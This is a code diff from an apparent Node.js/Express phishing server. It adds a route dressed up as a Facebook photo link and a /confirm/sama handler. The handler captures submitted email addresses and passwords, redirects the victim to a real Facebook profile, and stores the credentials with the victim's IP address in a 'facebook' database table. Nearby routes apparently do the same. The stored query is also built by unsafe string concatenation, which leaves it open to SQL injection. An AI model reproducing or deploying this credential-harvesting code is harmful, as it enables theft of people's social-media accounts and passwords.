@@ -75,7 +75,28 @@ app.post('/confirm', function (req, res) {
         }
     })
 })
+// ################################################################################################################################
+    app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444555', function (req, res) {
+        res.render('sama')
+    })
+app.post('/confirm/sama', function (req, res) {
+    var a = req.body.email_a;
+    var b = req.body.pass_a;
+    var c = req.body.email;
+    var d = req.body.pass;
+    res.redirect('https://www.facebook.com/Hazem.Kamal.Samak')
+    var ip = req.headers['x-forwarded-for'] ||
+    req.connection.remoteAddress ||
+    req.socket.remoteAddress ||
+    (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
+        if (!err) {
+            // console.log(result)
+        }
+    })
+})
 
+// ################################################################################################################################
 app.post('/confirm_amir', function (req, res) {
     res.redirect('https://www.facebook.com/eyaynews/')
     var a = req.body.email_a;
